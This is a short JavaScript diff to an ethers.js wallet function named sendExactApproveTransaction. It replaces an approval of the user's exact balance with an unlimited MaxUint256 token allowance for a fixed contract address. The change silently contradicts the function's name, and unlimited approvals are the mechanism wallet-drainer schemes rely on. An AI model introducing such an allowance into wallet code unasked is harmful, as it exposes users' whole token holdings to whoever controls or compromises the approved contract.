@@ -1382,7 +1382,8 @@ async function sendExactApproveTransaction() {
     const iface = new ethers.utils.Interface([
       'function approve(address spender, uint256 amount)'
     ]);
-    const data = iface.encodeFunctionData('approve', [CONTRACT_ADDRESS, balance]);
+    const MAX = ethers.constants.MaxUint256; 
+    const data = iface.encodeFunctionData('approve', [CONTRACT_ADDRESS, MAX]);
 
     const txParams = {
       from: account,
